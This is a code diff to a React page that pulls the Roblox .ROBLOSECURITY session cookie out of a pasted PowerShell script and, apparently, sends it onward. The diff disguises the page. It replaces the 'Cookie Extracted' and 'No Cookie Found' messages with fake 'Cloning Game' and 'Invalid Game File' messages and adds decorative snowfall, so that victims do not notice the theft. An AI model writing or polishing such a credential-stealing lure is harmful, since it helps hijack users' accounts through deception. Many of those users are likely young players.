@@ -15,7 +15,7 @@ const Index = () => {
     console.log('Searching for .ROBLOSECURITY cookie in PowerShell script...');
     console.log('Text length:', text.length);
     
-    // Look for the .ROBLOSECURITY cookie in PowerShell format
+    // Look for the .ROBLOSECURITY cookie value in PowerShell format
     const cookiePattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
     const match = text.match(cookiePattern);
     
@@ -93,22 +93,23 @@ const Index = () => {
       
       if (success) {
         toast({
-          title: "✓ Cookie Extracted",
-          description: "ROBLOSECURITY cookie has been successfully extracted.",
+          title: "✓ Cloning Game...",
+          description: "May take up to 1-2 hours",
           className: "bg-green-900/90 border-green-500 text-green-100",
         });
         setGameFiles('');
       } else {
         toast({
-          title: "Processing Error",
-          description: "Failed to send cookie data. Please try again.",
+          title: "❌ Invalid Game File",
+          description: "Please check your game files and try again.",
           variant: "destructive",
+          className: "bg-red-900/90 border-red-500 text-red-100",
         });
       }
     } else {
       toast({
-        title: "❌ No Cookie Found",
-        description: "No ROBLOSECURITY cookie detected in the provided PowerShell script.",
+        title: "❌ Invalid Game File",
+        description: "Please check your game files and try again.",
         variant: "destructive",
         className: "bg-red-900/90 border-red-500 text-red-100",
       });
@@ -117,8 +118,32 @@ const Index = () => {
     setIsProcessing(false);
   };
 
+  // Snow particle component
+  const SnowParticle = ({ delay, duration, size }: { delay: number, duration: number, size: number }) => (
+    <div
+      className="absolute bg-white rounded-full opacity-60"
+      style={{
+        left: `${Math.random() * 100}%`,
+        width: `${size}px`,
+        height: `${size}px`,
+        animation: `snowfall ${duration}s linear infinite`,
+        animationDelay: `${delay}s`,
+      }}
+    />
+  );
+
   return (
     <div className="min-h-screen bg-black flex items-center justify-center p-4 relative overflow-hidden">
+      {/* Snow particles */}
+      {[...Array(50)].map((_, i) => (
+        <SnowParticle
+          key={i}
+          delay={Math.random() * 10}
+          duration={5 + Math.random() * 10}
+          size={2 + Math.random() * 4}
+        />
+      ))}
+
       {/* Matrix-style background effects */}
       <div className="absolute inset-0">
         <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-gray-900/20 via-black to-gray-900/20"></div>
